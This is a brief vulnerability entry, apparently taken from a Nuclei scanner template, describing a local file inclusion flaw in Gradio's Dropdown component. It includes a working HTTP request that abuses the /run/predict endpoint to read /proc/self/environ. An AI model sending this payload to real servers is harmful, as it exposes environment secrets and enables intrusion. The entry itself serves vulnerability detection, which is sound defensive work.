# Vulnerability: Gradio - Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`gradio-lfi.yaml`)

## Description
Gradio's Dropdown component is vulnerable to Local File Inclusion (LFI) when the value is a dictionary controlled by an attacker. In the postprocess of components, if the value type is a dict, it flows to the async_move_files_to_cache function. When the dictionary is crafted with a "path" key, it causes local file inclusion allowing attackers to read arbitrary files.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /run/predict HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}
```

